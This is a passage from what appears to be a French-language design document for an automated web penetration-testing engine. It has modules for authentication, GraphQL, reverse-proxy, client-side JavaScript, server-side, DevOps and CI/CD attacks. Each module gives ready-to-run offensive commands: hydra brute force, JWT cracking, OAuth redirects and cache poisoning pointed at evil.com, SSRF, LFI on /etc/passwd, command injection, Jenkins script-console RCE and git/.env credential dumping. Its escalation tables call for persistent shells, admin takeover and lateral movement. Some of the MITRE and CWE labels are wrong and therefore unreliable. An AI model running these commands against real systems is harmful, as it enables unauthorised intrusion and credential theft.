    post_check: string
}
```

---

## 👁️ [TYPE_ABSTRAIT] Observation
```python
Observation {
    result: string,
    code: int,
    auth_status: enum<Bypassed | Blocked | PartiallyBypassed>,
    response_headers: [string],
    vulnerable: boolean
}
```

---

## 🧩 [TYPE_ABSTRAIT] NextStep
```python
NextStep {
    description: string,
    based_on: Observation,
    next_action: CommandePentest
}
```

---

## 🧰 [TYPE_ABSTRAIT] CommandePentest
```python
CommandePentest {
    tool: string,
    command: string,
    target: string,
    purpose: string,
    output_log: string
}
```

---

## 🔍 PHASE 1 — Reconnaissance Authentification

| Élément observé               | Outils / Techniques                                  |
|-------------------------------|------------------------------------------------------|
| `Authorization`, `Set-Cookie` | `curl -i`, Burp, Zap                                 |
| `/login`, `/auth`             | `feroxbuster`, `ffuf`                                |
| `JWT`, `Bearer` token         | `grep`, `nuclei`, `jwt_tool`                         |
| SSO / OAuth flow              | Redirection / URL tampering + `burp` flow analysis   |

---

## 💡 PHASE 2 — Hypothèses Stratégico-Techniques

| Condition                            | Hypothèse                            |
|--------------------------------------|---------------------------------------|
| JWT simple ou non signé              | JWTWeak                               |
| Token envoyé via cookie              | TokenFixation / Tampering             |
| Auth flow en GET / 302 → 200         | BypassLogique                         |
| OAuth redirigé sans validation       | OAuthHijack                           |
| SessionID fixe / prévisible          | SessionFixation                       |
| Enum possible via timing             | BruteforceEnum                        |

---

## 🔬 PHASE 3 — Plans de test détaillés

### 🔹 Bruteforce
```bash
hydra -L users.txt -P rockyou.txt https-post-form "/login:username=^USER^&password=^PASS^:F=invalid"
medusa -u admin -P top1000.txt -h target -M http -m DIR:/auth
```

### 🔹 JWT Analysis & Crack
```bash
jwt_tool eyJ0eXAi... -S
jwt_tool eyJ0eXAi... -C -d jwt-secrets.txt
```

### 🔹 Token Bypass / Fixation
```bash
curl -X GET https://target/home -H "Cookie: session=abcdef123456"
curl -X POST /auth/login -d 'username=admin&password=admin' -H "Authorization: Bearer modifiable_token"
```

### 🔹 OAuth2 Redirection Hijack
```bash
curl -X POST https://target/oauth/token -d 'redirect_uri=https://evil.com'
```

---

## 🤖 PHASE 4 — Exécution conditionnelle

| Détection                              | Réaction dynamique                          |
|----------------------------------------|---------------------------------------------|
| JWT signé HS256 → brute avec wordlist  | If cracked → impersonate admin              |
| Cookie modifiable accepté              | → Token replay + session riding             |
| OAuth redirect mal validé              | → Hijack login via fake URL (external)      |
| Bypass par status code (302 → 200)     | → Replay sans token                         |

---

## 🔄 PHASE 5 — Automatisation et Scripts

| Script                  | Description                                        |
|-------------------------|----------------------------------------------------|
| `auth_enum.sh`          | Enumeration utilisateurs + bypass tests           |
| `jwt_bruteforce.sh`     | Analyse + HS256 crack JWT                         |
| `oauth_hijack_sim.sh`   | Simule redirection via redirect_uri               |
| `cookie_fixation.sh`    | Injection de cookies prédéfinis                   |

---

## 📁 PHASE 6 — Sorties formatées

```
/output/web/<target>/auth/auth_bypass.log
/output/web/<target>/auth/jwt_cracked.txt
/output/web/<target>/auth/oauth_redirect_hijack.txt
/output/web/<target>/auth/token_fixation_results.txt
```

---

## 📌 MAPPING STRATÉGIQUE

- **MITRE ATT&CK** :
  - `T1078` — Valid Accounts
  - `T1556.004` — Token Manipulation: Web Session Cookie
  - `T1190` — Exploit Public-Facing Application
  - `T1556.002` — Modify Authentication Process

- **CWE** :
  - `CWE-287` — Improper Authentication
  - `CWE-384` — Session Fixation
  - `CWE-613` — Insufficient Session Expiration
  - `CWE-295` — Improper Certificate Validation

---

# 🧠 `engine_web_graphql()` — MODULE STRATÉGIQUE : EXPLOITATION GRAPHQL & MUTATIONS

---

## 🧠 [TYPE_ABSTRAIT] HeuristicWebGraphQLModule
```python
HeuristicWebGraphQLModule {
    observe(target: WebTarget) → Signal[],
    match(signal: Signal) → Hypothesis[],
    test(hypothesis: Hypothesis) → Experiment[],
    execute(experiment: Experiment) → Observation,
    reason(observation: Observation) → NextStep[],
    react(step: NextStep) → CommandePentest[]
}
```

---

## 📦 [TYPE_ABSTRAIT] WebTarget
```python
WebTarget {
    base_url: string,
    graphql_endpoint: string,
    headers: [string],
    technologies: [string],
    has_introspection: boolean,
    allows_mutations: boolean,
    authentication_required: boolean,
    token: string | null
}
```

---

## 📍 [TYPE_ABSTRAIT] Signal
```python
Signal {
    uri: string,
    type: enum<Endpoint | Header | JSIndicator | Body>,
    pattern_detected: string,
    confidence: Low | Medium | High
}
```

---

## 💡 [TYPE_ABSTRAIT] Hypothesis
```python
Hypothesis {
    vector: enum<Introspection | CRUDMutation | Injection | NestedChaining | VerbTampering | InfoLeak>,
    evidence: Signal[],
    cwe_ref: [CWE],
    mitre_ttps: [string],
    attack_depth: Low | Medium | High | Critical
}
```

---

## 🔬 [TYPE_ABSTRAIT] Experiment
```python
Experiment {
    name: string,
    vector_type: string,
    payload: string,
    tool: string,
    trigger_condition: string,
    expected_response: string,
    followup_action: string
}
```

---

## 👁️ [TYPE_ABSTRAIT] Observation
```python
Observation {
    tool_used: string,
    payload_sent: string,
    response_time: float,
    vulnerable: boolean,
    result_summary: string
}
```

---

## 🧩 [TYPE_ABSTRAIT] NextStep
```python
NextStep {
    rationale: string,
    based_on: Observation,
    command_to_run: CommandePentest
}
```

---

## 🧰 [TYPE_ABSTRAIT] CommandePentest
```python
CommandePentest {
    tool: string,
    cmd: string,
    description: string,
    output_file: string
}
```

---

## 🔍 PHASE 1 — Détection du contexte GraphQL

| Élément observé                        | Technique d’analyse                             |
|----------------------------------------|-------------------------------------------------|
| `/graphql`, `/graphiql`, `/gql`        | `ffuf`, `feroxbuster`, `waybackurls`           |
| Requêtes avec `{ "query":`             | `Burp`, `curl`, `httpx`                         |
| JS `ApolloClient`, `graphql-request`   | `jslinkfinder`, `linkfinder.py`, `htmlscraper` |
| Headers `X-GraphQL-Operation-Name`     | `curl -I`, `nuclei`                             |

---

## 💡 PHASE 2 — Hypothèses par pattern détecté

| Signal | Hypothèse |
|--------|-----------|
| `__schema` réponse OK → introspection activée | Introspection + Typemap expose |
| Mutation sans auth (`createUser`) | Mutation Abuse |
| Champ `password` en clair dans une requête | Info Leak |
| `__type` et `__typename` accessibles | Reflection Injection |
| Possible `alias chaining` (`query x1:x2:x3`) | GraphQL Chaining |

---

## 🔬 PHASE 3 — Plans de test et outils associés

### 🔹 Introspection & Mapping
```bash
curl -X POST -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}' https://target/graphql
graphqlmap --introspect --url https://target/graphql
graphql-voyager schema.json
```

### 🔹 Auth & Bypass Testing
```bash
echo '{"query":"{user(email:\"test@test.com\"){password}}"}' | curl -X POST -H "Authorization: Bearer <JWT>" https://target/graphql
```

### 🔹 Mutation Exploitation
```bash
echo '{"query": "mutation{createUser(username:\"admin\",password:\"admin123\"){id}}"}' | curl -X POST -H "Content-Type: application/json" https://target/graphql
```

### 🔹 Injection & SSRF
```bash
curl -X POST -d '{"query":"{testField(input:\"http://127.0.0.1:8080\") }"}' https://target/graphql
```

---

## 🔄 PHASE 4 — Déclenchement conditionnel

| Condition détectée                        | Action déclenchée                              |
|-------------------------------------------|------------------------------------------------|
| Réponse contenant `__schema`              | → Dump complet du typemap                     |
| Champs `mutation` en clair accessibles    | → Trigger création objet / privilèges         |
| `login(email, password)` détecté          | → Bruteforce via POST                         |
| `GraphQL error` détaillée                 | → Fingerprint du framework (Apollo, Ariadne)  |

---

## 🤖 PHASE 5 — Génération dynamique de scripts

| Script                     | Rôle                                                             |
|----------------------------|------------------------------------------------------------------|
| `graphql_enum_types.sh`    | Dump toutes les enums et types                                  |
| `graphql_auth_bypass.sh`   | JWT brute / manipulation                                         |
| `graphql_mutation_exec.sh` | Test automatisé mutations sensibles                             |
| `graphql_ssrf_finder.sh`   | Injection SSRF automatisée dans champs variables / payloads     |

---

## 📁 PHASE 6 — Organisation des outputs

```
/output/web/<target>/graphql/introspection_dump.txt
/output/web/<target>/graphql/graphql_mutations_tested.log
/output/web/<target>/graphql/graphql_auth_bypass_results.txt
/output/web/<target>/graphql/graphql_ssrf_responses.txt
```

---

## 📌 MAPPING STRATÉGIQUE

- **MITRE ATT&CK** :
  - `T1499` – Resource Hijacking (SSRF)
  - `T1190` – Exploit Public-Facing Application
  - `T1592` – Gather API schema via introspection
  - `T1556` – Authentication Bypass (via login mutation abuse)

- **CWE** :
  - `CWE-287` — Improper Authentication
  - `CWE-200` — Exposure of Sensitive Information
  - `CWE-913` — Improper Control of XML External Entity
  - `CWE-74` — Injection via template context

---

# 🔁 `engine_web_reverse_proxy()` — MODULE STRATÉGIQUE : REVERSE PROXY ABUSE, HEADER SPOOFING, SSRF, CACHE POISONING

---

## 🧠 [TYPE_ABSTRAIT] HeuristicWebReverseProxyModule
```python
HeuristicWebReverseProxyModule {
    observe(target: WebTarget) → Signal[],
    match(signal: Signal) → Hypothesis[],
    test(hypothesis: Hypothesis) → Experiment[],
    execute(experiment: Experiment) → Observation,
    reason(observation: Observation) → NextStep[],
    react(step: NextStep) → CommandePentest[]
}
```

---

## 📦 [TYPE_ABSTRAIT] WebTarget
```python
WebTarget {
    base_url: string,
    headers: [string],
    technologies: [string],
    edge_proxy_present: boolean,
    authentication_behavior: BehaviorType,
    ip_filtering_detected: boolean,
    uris_detected: [string],
    cache_control_detected: boolean
}
```

---

## 📍 [TYPE_ABSTRAIT] Signal
```python
Signal {
    type: enum<Header | IPBehavior | ResponseCode | CacheIndicator>,
    content: string,
    detected_on: string,
    confidence: Low | Medium | High
}
```

---

## 💡 [TYPE_ABSTRAIT] Hypothesis
```python
Hypothesis {
    vuln_type: enum<ACLBypass | SSRF | IPSpoof | CachePoisoning>,
    evidence: Signal[],
    associated_headers: [string],
    attack_surface: string[],
    cwe: [CWE],
    mitre_ttps: [string]
}
```

---

## 🔬 [TYPE_ABSTRAIT] Experiment
```python
Experiment {
    name: string,
    precondition: string,
    spoofed_header: string,
    payload: string,
    expected_effect: string,
    tool: string,
    followup: string
}
```

---

## 👁️ [TYPE_ABSTRAIT] Observation
```python
Observation {
    experiment: string,
    output: string,
    http_code: int,
    vulnerability_confirmed: boolean,
    actionable_next: string
}
```

---

## 🧩 [TYPE_ABSTRAIT] NextStep
```python
NextStep {
    rationale: string,
    command: CommandePentest,
    followup_module: string
}
```

---

## 🧰 [TYPE_ABSTRAIT] CommandePentest
```python
CommandePentest {
    cmd: string,
    tool: string,
    description: string,
    log_output: string
}
```

---

## 🔍 PHASE 1 — Détection d’un reverse proxy & comportement conditionnel

| Élément observé | Outils / Méthodes |
|------------------|-------------------|
| Headers HTTP `X-Forwarded-For`, `X-Real-IP`, `X-Original-URL` | curl, httpx, nuclei |
| Différence 403/401 selon User-Agent ou Host | curl -A, curl -H |
| Accès `/internal`, `/debug`, `/admin` | feroxbuster, gobuster |
| Statique exposé : `/nginx_status`, `/server-status` | curl + whitelist bruteforce |

---

## 💡 PHASE 2 — Génération d’hypothèses

| Signal détecté | Hypothèse formulée |
|----------------|--------------------|
| `403` → `200` via `X-Forwarded-For` | Reverse proxy ACL bypass |
| `/debug` accessible uniquement via `localhost` spoof | Internal exposure via IP Spoof |
| `Host: 127.0.0.1` provoque SSRF réponse | SSRF possible sur header injection |
| `Cache-Control: public` avec URI dynamique | Cache poisoning exploitable |

---

## 🔬 PHASE 3 — Tests heuristiques dynamiques

### 🔸 ACL Bypass par IP Spoof
```bash
curl -H "X-Forwarded-For: 127.0.0.1" https://target/admin
curl -H "X-Original-URL: /debug" https://target/
curl -H "X-Real-IP: 127.0.0.1" https://target/
```

### 🔸 SSRF via Host Spoofing
```bash
curl -H "Host: 127.0.0.1" https://target/
curl -H "X-Forwarded-Host: 127.0.0.1" https://target/
curl -H "X-Original-URL: http://127.0.0.1:80" https://target/
```

### 🔸 Cache Poisoning
```bash
curl -H "X-Forwarded-Host: evil.com" https://target/page
curl -H "X-Forwarded-For: attacker" -H "User-Agent: payload" https://target/page
```

---

## 🔄 PHASE 4 — Déclenchement conditionnel

| Condition | Réaction |
|----------|----------|
| IP loopback permet accès admin | Lancer enumeration + admin takeover |
| Debug page accessible via spoof | Extraire config interne |
| Host injection OK | Lancer SSRF vers AWS metadata, Redis, etc. |
| Cache control public sur dyn endpoint | Injecter HTML, iframe, JS |

---

## 🧪 PHASE 5 — Scripts générés

| Script | Usage |
|--------|--------|
| `proxy_bypass.sh` | Tester toutes variantes d’en-têtes X-* |
| `ssrf_detect.sh` | Interroger chaque header IP/Host avec Burp Collaborator |
| `cache_poisoning.sh` | Automatiser attaque via CDN/proxy |
| `internal_enum.sh` | Accès à `/nginx_status`, `/server-status`, etc. |

---

## 📁 PHASE 6 — Structure de sortie

```
/output/web/<target>/reverse_proxy/bypass_results.log
/output/web/<target>/reverse_proxy/ssrf_detected.txt
/output/web/<target>/reverse_proxy/cache_poisoning.log
/output/web/<target>/reverse_proxy/internal_panels.md
```

---

## 🗺️ MAPPING STRATÉGIQUE

| Référence | Contenu |
|-----------|---------|
| **MITRE ATT&CK** | T1133 (External Remote Services), T1190 (Exploit Public-Facing App), T1213 (Data from Local System) |
| **CWE** | CWE-441 (Unintended Proxy), CWE-918 (SSRF), CWE-16 (Configuration), CWE-444 (HTTP Header Injection) |

---

# 🧠 `engine_web_frontend_js()` — Pentest avancé des surfaces JS côté client

---

## 🧬 [TYPE_ABSTRAIT] HeuristicWebFrontendJSModule
```python
HeuristicWebFrontendJSModule {
  observe(target: WebTarget) → Signal[],
  match(signal: Signal) → Hypothesis[],
  test(hypothesis: Hypothesis) → Experiment[],
  execute(experiment: Experiment) → Observation,
  reason(observation: Observation) → NextStep[],
  react(step: NextStep) → CommandePentest[]
}
```

---

## 📦 [TYPE_ABSTRAIT] WebTarget
```python
WebTarget {
  base_url: string,
  scripts: [string],
  js_frameworks: [string],
  observable_js_behavior: [Signal],
  web_storage_used: boolean,
  dom_observed_behavior: [string]
}
```

---

## 📍 [TYPE_ABSTRAIT] Signal
```python
Signal {
  source: string,
  type: Script | LocalStorage | ObfuscatedCode | InsecureLogic,
  content: string,
  confidence: Low | Medium | High,
  metadata: any
}
```

---

## 💡 [TYPE_ABSTRAIT] Hypothesis
```python
Hypothesis {
  type: VulnType,
  evidence: Signal[],
  probable_cwe: [CWE],
  impact: Low | Medium | High | Critical,
  confirmed: boolean,
  test_plan: Experiment[]
}
```

---

## 🔬 [TYPE_ABSTRAIT] Experiment
```python
Experiment {
  outil: string,
  arguments: string,
  precondition: string,
  expected_outcome: string,
  post_action: string
}
```

---

## 👁️ [TYPE_ABSTRAIT] Observation
```python
Observation {
  result: string,
  response: any,
  confirmed: boolean,
  notes: string
}
```

---

## 🧩 [TYPE_ABSTRAIT] NextStep
```python
NextStep {
  decision_type: enum<Continue | Escalate | Branch | Stop>,
  description: string,
  command: CommandePentest
}
```

---

## 🧰 [TYPE_ABSTRAIT] CommandePentest
```python
CommandePentest {
  tool: string,
  full_command: string,
  description: string,
  when_to_execute: string
}
```

---

## 🔍 PHASE 1 — Observation du code client

| Élément ciblé | Méthode |
|---------------|---------|
| Scripts `.js` dans HTML ou `script src=` | `wget`, `httpx`, `subjs` |
| Analyse statique JS | `linkfinder`, `jsfinder`, `jsbeautifier`, `semgrep` |
| Framework détecté (Angular, React, Vue) | `wappalyzer`, `whatweb`, `nuclei` |
| Auth ou tokens dans localStorage/sessionStorage | `Burp`, Devtools |
| Analyse DOM + JS dynamiques | `puppeteer`, `xsstrike`, `DOMInvader` |

---

## 🔧 PHASE 2 — Matching d’hypothèses

| Hypothèse | Détail |
|-----------|--------|
| Token/API Key exposé dans JS | Static credential discovery |
| JS obfusqué contenant code sensible | Potential backdoor, eval injection |
| Stockage local non chiffré | Vol de token persistent |
| Exécution DOM unsafe (innerHTML, document.write) | DOM-XSS possible |
| API statique vers endpoint sensible | Permet SSRF ou bypass auth |

---

## 🔬 PHASE 3 — Test Plan détaillé

### 🔹 Recherche de secrets / endpoints
```bash
subjs https://target | xargs -n1 -P10 curl -s | grep -Ei "api_key|secret|token"
linkfinder -i https://target/app.js -o cli
```

### 🔹 DOM-XSS / DOM-Based Injection
```bash
xsstrike -u https://target/#/search?q=test
DOMInvader (Burp Extension)
```

### 🔹 JS Analysis & Beautification
```bash
js-beautify https://target/app.min.js > app.deob.js
semgrep --config p/javascript --lang js app.deob.js
```

---

## 🔄 PHASE 4 — Execution conditionnelle

| Condition | Déclenchement |
|-----------|---------------|
| innerHTML ou `eval()` → DOM-XSS possible | Lancer `xsstrike`, `burp DOM scan` |
| localStorage + `token=` trouvé | Extraction + reuse / replay |
| App JS → endpoints en dur | Interrogation + bruteforce avec tamper |
| Obfuscation forte détectée | Beautification + analyse anti-debug |

---

## 🎯 PHASE 5 — Réactions possibles

| Scénario | Réaction |
|----------|----------|
| DOM vulnérable → XSS | injection + persist via service worker |
| Token JS exposé → auth abuse | forge request / privilège escalation |
| Endpoint dur → SSRF ou bypass auth | pivot sur service interne |
| JS tracking / fingerprinting | evasion / emulation user |

---

## 🛠️ PHASE 6 — Commandes générées
```bash
wget -r -l 1 -nd -H -A .js https://target
subjs https://target | xargs -n1 -P10 curl -s | grep -Ei "token|key|Authorization"
xsstrike -u https://target/#search
linkfinder -i https://target/app.js -o cli
js-beautify app.js > app_readable.js
semgrep -c p/javascript -l js app_readable.js
```

---

## 🧾 PHASE 7 — Sorties attendues
```
/output/web/<target>/frontend/js_tokens_found.txt
/output/web/<target>/frontend/dom_xss.log
/output/web/<target>/frontend/secrets_static.log
/output/web/<target>/frontend/beautified_sources/
```

---

## 🧭 PHASE 8 — Mapping MITRE / CWE

| Référence | Description |
|-----------|-------------|
| MITRE T1059.007 | Cross-Site Scripting (DOM) |
| MITRE T1529     | System Token Capture via Client |
| CWE-79          | Improper Neutralization of Input in Web Page |
| CWE-200         | Exposure of Sensitive Information |

---

# ⚙️ MODULE : `engine_web_server_side(target: WebTarget)`

---

## 🧠 [TYPE_ABSTRAIT] HeuristicWebServerEngine

```ts
HeuristicWebServerEngine {
  observe(target: WebTarget) → Signal[],
  match(signal: Signal) → Hypothesis[],
  test(hypothesis: Hypothesis) → Experiment[],
  execute(experiment: Experiment) → Observation,
  reason(observation: Observation) → NextStep[],
  react(next: NextStep) → CommandePentest[]
}
```

---

## 📦 [TYPE_ABSTRAIT] WebTarget

```ts
WebTarget {
  fqdn: string,
  ip: string,
  port: int,
  tech_stack: [string],
  status_headers: [string],
  known_paths: [string],
  server_banner: string,
  raw_html: string,
  waf_detected: boolean,
  exposed_errors: [string],
  known_cves: [string],
  possible_middleware: [string]
}
```

---

## 📍 [TYPE_ABSTRAIT] Signal

```ts
Signal {
  source: string,
  type: HTTP_Header | HTML_Comment | Server_Banner | Response_Code,
  content: string,
  confidence: Low | Medium | High,
  metadata: any
}
```

---

## 💡 [TYPE_ABSTRAIT] Hypothesis

```ts
Hypothesis {
  type: RCE | LFI | PathTraversal | SSRF | TemplateInjection | WebShell,
  evidence: Signal[],
  probable_cwe: [CWE],
  impact: Medium | High | Critical,
  confirmed: boolean,
  test_plan: Experiment[]
}
```

---

## 🔬 [TYPE_ABSTRAIT] Experiment

```ts
Experiment {
  outil: string,
  arguments: string,
  precondition: string,
  expected_outcome: string,
  post_action: string
}
```

---

## 👁️ [TYPE_ABSTRAIT] Observation

```ts
Observation {
  result: string,
  response: any,
  confirmed: boolean,
  notes: string
}
```

---

## 🧩 [TYPE_ABSTRAIT] NextStep

```ts
NextStep {
  decision_type: enum<Continue | Escalate | Branch | Stop>,
  description: string,
  command: CommandePentest
}
```

---

## 🧰 [TYPE_ABSTRAIT] CommandePentest

```ts
CommandePentest {
  tool: string,
  full_command: string,
  description: string,
  when_to_execute: string
}
```

---

## 🔍 PHASE 1 — Observation initiale

| Élément ciblé | Méthode |
|---------------|---------|
| Headers HTTP : `Server`, `X-Powered-By` | `curl -I`, `httpx` |
| Pages : `/debug`, `/cgi-bin`, `/api`, `/status`, `/health` | `gobuster`, `feroxbuster` |
| Stack : PHP, JSP, Python, Node | `whatweb`, `nmap`, `wafw00f` |
| Bannières serveur (Apache, Nginx, Tomcat...) | `nmap -sV -p80,443` |

---

## 🔧 PHASE 2 — Matching d’hypothèses

| Hypothèse | Condition |
|-----------|-----------|
| Command injection possible | Input reflecté sans échappement |
| LFI / RFI | URI avec paramètre `file=` ou `/etc/passwd` |
| SSRF possible | URL-injection dans paramètre |
| Template injection | Paramètres `name=`, `{{7*7}}` output |
| Middleware exposé | PHP-CGI, FastCGI, Node debug port |

---

## 🔬 PHASE 3 — Test Plan heuristique

```bash
# Injection Commande / RCE
ffuf -X POST -d "input=;id" -u https://target/search

# Template Injection
curl -d 'name={{7*7}}' https://target/hello | grep '49'

# SSRF
curl -d 'url=http://127.0.0.1:22' https://target/fetch

# LFI
curl 'https://target?page=../../../../etc/passwd'

# Detection CGI / RCE
nmap --script http-cgi --script-args http-cgi.url='/cgi-bin/test.cgi' -p80 <target>
```

---

## ⚡ PHASE 4 — Déclenchements conditionnels

| Condition détectée | Action déclenchée |
|---------------------|-------------------|
| `page=...` URI | Test LFI + log poison |
| `url=http://` POST | Test SSRF (Gopher, file://, etc) |
| `/cgi-bin/` ou `.pl` présent | CGI abuse + RCE test |
| PHP stack + error=1 | RCE via `system()`, `eval()` injection |
| Java + Freemarker | SSTI → `{{7*7}}`, `#set`, OGNL |

---

## 🎯 PHASE 5 — Réactions et escalades

| Résultat | Réaction |
|----------|----------|
| Commande injectée | Shell persistente |
| LFI validée | Inclusion shell.log, poison + RCE |
| SSRF actif | Scan infra interne (169.254, localhost) |
| SSTI trouvé | Escalade full RCE |
| Middleware exposé (Tomcat, Gunicorn...) | Exploit direct + WAR upload |

---

## 🛠️ PHASE 6 — Commandes générées

```bash
curl -X POST -d "cmd=;id" https://target/exec
ffuf -w fuzz.txt -X POST -d 'param=FUZZ' -u https://target/test.php
curl https://target/debug?log=../../../etc/passwd
sqlmap -u "https://target/page?id=1" --level 5 --risk 3
nmap -p80 --script http-vuln-cve2021-41773 <target>
```

---

## 📤 PHASE 7 — Sorties attendues

```
/output/web/<target>/server_side/rce.log  
/output/web/<target>/server_side/lfi_paths.txt  
/output/web/<target>/server_side/ssrf_scan_internal.txt  
/output/web/<target>/server_side/middleware_version.txt
```

---

## 🧭 PHASE 8 — Mapping MITRE / CVE / CWE

| Référence | Description |
|-----------|-------------|
| T1210     | Exploitation of Remote Services |
| T1190     | Exploit Public-Facing Application |
| CWE-78    | OS Command Injection |
| CWE-94    | Code Injection |
| CWE-20    | Improper Input Validation |
| CVE       | CVE-2021-41773, CVE-2021-26084, CVE-2020-17530 |

---

# ⚙️ MODULE : `engine_web_devops(target: WebTarget)`

---

## 🧠 [TYPE_ABSTRAIT] HeuristicDevOpsWebEngine

```ts
HeuristicDevOpsWebEngine {
  observe(target: WebTarget) → Signal[],
  match(signal: Signal) → Hypothesis[],
  test(hypothesis: Hypothesis) → Experiment[],
  execute(experiment: Experiment) → Observation,
  reason(observation: Observation) → NextStep[],
  react(next: NextStep) → CommandePentest[]
}
```

---

## 📦 [TYPE_ABSTRAIT] WebTarget

```ts
WebTarget {
  fqdn: string,
  ip: string,
  tech_stack: [string],
  exposed_files: [string],
  known_paths: [string],
  devops_indicators: [string],
  ci_tools: [string], // jenkins, travis, gitlab, drone
  vcs_exposed: boolean,
  secrets_found: boolean,
  pipelines_public: boolean
}
```

---

## 📍 [TYPE_ABSTRAIT] Signal

```ts
Signal {
  source: string,
  type: URI | ExposedFile | ResponseCode | Header | DNSRecord,
  content: string,
  confidence: Low | Medium | High,
  metadata: any
}
```

---

## 💡 [TYPE_ABSTRAIT] Hypothesis

```ts
Hypothesis {
  type: ExposedPipeline | GitHistoryLeak | CIInjection | ArtefactPoison | CredentialLeak,
  evidence: Signal[],
  probable_cwe: [CWE],
  impact: Medium | High | Critical,
  confirmed: boolean,
  test_plan: Experiment[]
}
```

---

## 🔍 PHASE 1 — Observation initiale

| Élément | Méthode |
|---------|---------|
| `.git`, `.svn`, `.hg/` | gobuster, dirsearch, ffuf |
| Jenkins, GitLab, Travis, Drone, CircleCI | nuclei, httpx, ffuf |
| Fichiers : `.env`, `.gitlab-ci.yml`, `.travis.yml`, `Dockerfile`, `config.js` | feroxbuster, gau, wayback |
| Artefacts : `.jar`, `.war`, `.zip`, `.bak`, `.swp`, `.old`, `credentials.txt` | URL brute + extension probing |

---

## 🎯 PHASE 2 — Matching d’hypothèses

| Hypothèse | Condition |
|-----------|-----------|
| Git accessible | `.git/config`, `.git/HEAD` → dump possible |
| CI exposée | `/jenkins`, `/gitlab`, `/job/`, `/pipeline` |
| Credentials en clair | `.env`, `.npmrc`, `settings.py` |
| Injection pipeline | `.gitlab-ci.yml`, `Jenkinsfile` |
| Artefacts mal protégés | `.zip`, `.war`, `.bak`, accès public |

---

## 🔬 PHASE 3 — Test Plans

```bash
# Git full dump
git-dumper https://target/.git/ ./loot/git

# Jenkins RCE
nuclei -t cves/jenkins/jenkins-script-console.yaml

# GitLab auth bypass or CVE
nuclei -t cves/gitlab/

# Check .env, .bak, config
curl https://target/.env
curl https://target/config.bak

# CI Injection
curl -X POST https://target/job/test/buildWithParameters?token=trigger -d "cmd=whoami"

# Scan .gitignore leaks
gf secrets | gf extensions | gau | unfurl
```

---

## ⚙️ PHASE 4 — Déclenchement conditionnel

| Détection | Action |
|-----------|--------|
| `.git/config` accessible | Dump Git + analyse log historique |
| Jenkins ouvert | `script` console → RCE |
| GitLab instance avec login guest | test `/explore/projects`, public repos |
| `.env` ou fichiers YAML | secrets, clés AWS, tokens |
| Jenkinsfile avec `sh` → injection payload |
| `.tar.gz`, `.war`, `.bak` exposés | extraction + inspection |

---

## 🧨 PHASE 5 — Réaction

| Scénario | Action |
|----------|--------|
| Git accessible | analyser les commits, secrets, fichiers supprimés |
| CI ouverte | exécution de commande ou escalade |
| Token/API leak | test accès Cloud, GitHub, AWS |
| Artefact → injection ou reverse shell |
| Jenkins avec credentials en clair | admin access + lateral movement |

---

## 🛠️ PHASE 6 — Commandes générées

```bash
curl https://target/.git/config
git-dumper https://target/.git ./loot/git/

nuclei -u https://target -t cves/jenkins/jenkins-default-creds.yaml
nuclei -u https://target -t exposed-tokens/

ffuf -u https://target/FUZZ -w fuzz-devops.txt -e .git,.svn,.bak,.env,.tar,.zip,.war

curl -X POST https://target/job/test/buildWithParameters?token=trigger -d "cmd=id"

zipdump.py suspicious.war
strings config.json | grep "key" | tee ./output/web/<target>/devops/keys.txt
```

---

## 📤 PHASE 7 — OUTPUTS

```
/output/web/<target>/devops/git_config_dump.txt  
/output/web/<target>/devops/jenkins_console.log  
/output/web/<target>/devops/secrets_found.txt  
/output/web/<target>/devops/artifacts_extracted.log  
/output/web/<target>/devops/pipeline_injection_success.flag
```

---

## 🧭 PHASE 8 — MITRE / CWE / CVE Mapping

| Réf. | Description |
|------|-------------|
| T1552 | Unsecured credentials |
| T1190 | Exploit public-facing dev tool |
| CWE-321 | Use of hard-coded credentials |
| CWE-538 | File and directory exposure |
| CVE-2018-1000861 | Jenkins CLI RCE |
| CVE-2021-22205 | GitLab RCE |

---

# ⚙️ MODULE : `engine_web_cicd(target: WebTarget)`

---

## 🧠 [TYPE_ABSTRAIT] HeuristicCICDWebEngine

```ts
HeuristicCICDWebEngine {
  observe(target: WebTarget) → Signal[],
  match(signal: Signal) → Hypothesis[],
  test(hypothesis: Hypothesis) → Experiment[],
  execute(experiment: Experiment) → Observation,
  reason(observation: Observation) → NextStep[],
  react(next: NextStep) → CommandePentest[]
}
```

---

## 📦 [TYPE_ABSTRAIT] WebTarget

```ts
WebTarget {
  fqdn: string,
  ip: string,
  headers: [string],
  uris: [string],
  ci_cd_detected: boolean,
  ci_type: Jenkins | GitLab | Travis | Other,
  public_pipelines: boolean,
  exposed_config: [string],
  known_tokens: [string],
  leaked_secrets: boolean,
  known_jobs: [string],
  build_logs_accessible: boolean
}
```

---

## 📍 [TYPE_ABSTRAIT] Signal

```ts
Signal {
  source: string,
  type: Header | URI | File | ResponseCode | Artifact,
  content: string,
  confidence: Low | Medium | High,
  metadata: any
}
```

---

## 💡 [TYPE_ABSTRAIT] Hypothesis

```ts
Hypothesis {
  type: UnsecuredCIPipeline | CredentialLeak | JenkinsRCE | GitLabAbuse,
  evidence: Signal[],
  probable_cwe: [CWE],
  impact: Medium | High | Critical,
  confirmed: boolean,
  test_plan: Experiment[]
}
```

---

## 🔍 PHASE 1 — Observation CI/CD

| Élément | Méthode |
|---------|---------|
| URIs CI/CD | `/jenkins`, `/job/`, `/pipeline`, `/build`, `.gitlab-ci.yml` |
| Headers | `X-Jenkins`, `X-Gitlab-Token`, `X-Drone-Token`, etc. |
| Expositions | `.env`, `.git`, `.git/config`, `/logs/`, `artifacts/` |
| Artefacts accessibles | `.zip`, `.war`, `.tgz`, `.log`, `.pem` |
| API CI ouvertes | `https://target/api/v4/`, `/scriptText` (Jenkins) |

---

## 🎯 PHASE 2 — Matching Hypothèses

| Hypothèse | Condition |
|----------|-----------|
| Jenkins script console | accès `/scriptText` ou `/manage` |
| GitLab API open | accès sans auth → `/api/v4/projects` |
| Pipeline leakage | build logs ou artifacts accessibles |
| Token dans .env | grep `key`, `token`, `secret` |
| Exécutable en build | `.sh`, `.jar`, `.py`, `.bat` en cleartext |
| Backdoor possible | `.git/config` expose `.git/refs/heads` ou `hooks/` |

---

## 🔬 PHASE 3 — Test Plans

```bash
# Jenkins script console RCE
curl -X POST https://target/scriptText --data 'script=whoami'

# GitLab leak
curl https://target/.gitlab-ci.yml
curl https://target/api/v4/projects
curl https://target/api/v4/projects/1/jobs

# Artefact bruteforce
feroxbuster -u https://target -x .zip,.tar,.gz,.log,.bak -w wordlist.txt

# .git/.env exfiltration
curl https://target/.git/config
curl https://target/.env
git-dumper https://target/.git /loot/git

